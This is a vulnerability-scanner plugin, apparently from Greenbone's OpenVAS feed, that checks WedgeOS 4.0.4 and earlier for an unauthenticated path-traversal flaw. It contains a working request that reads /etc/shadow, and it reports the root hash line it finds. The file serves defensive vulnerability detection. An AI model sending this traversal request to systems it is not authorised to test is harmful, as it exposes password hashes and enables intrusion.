# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wedge_networks:wedgeos";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105311");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
  script_version("2025-01-31T05:37:27+0000");

  script_name("Wedge Networks WedgeOS <= 4.0.4 Multiple Vulnerabilities");

  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2015/Jun/86");
  script_xref(name:"URL", value:"https://web.archive.org/web/20171111055904/http://www.security-assessment.com/files/documents/advisory/WedgeOS-Final.pdf");

  script_tag(name:"summary", value:"Wedge Networks WedgeOS is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to read /etc/shadow via a special crafted HTTP GET
  request.");

  script_tag(name:"solution", value:"Update to a version later than 4.0.4.");

  script_tag(name:"insight", value:"The product contains a number of security vulnerabilities,
  including unauthenticated arbitrary file read as root, command injection in the web interface,
  privilege escalation to root, and command execution via the system update functionality.");

  script_tag(name:"affected", value:"WedgeOS version 4.0.4 and prior.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2015-07-02 13:50:31 +0200 (Thu, 02 Jul 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("gb_wedgeos_management_console_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("wedgeOS/management_console/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/ssgmanager/ssgimages?name=../../../../../etc/shadow";

host = http_host_name( dont_add_port:TRUE );

if( shadow = http_vuln_check( port:port, url:url, pattern:"root:.*:0:" ) )
{
  line = egrep( pattern:"root:.*:0:", string:shadow );
  line = chomp( line );

  report = 'By requesting "https://' + host + url + '" it was possible to retrieve the content\nof /etc/shadow.\n\n[...] ' + line + " [...]";
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
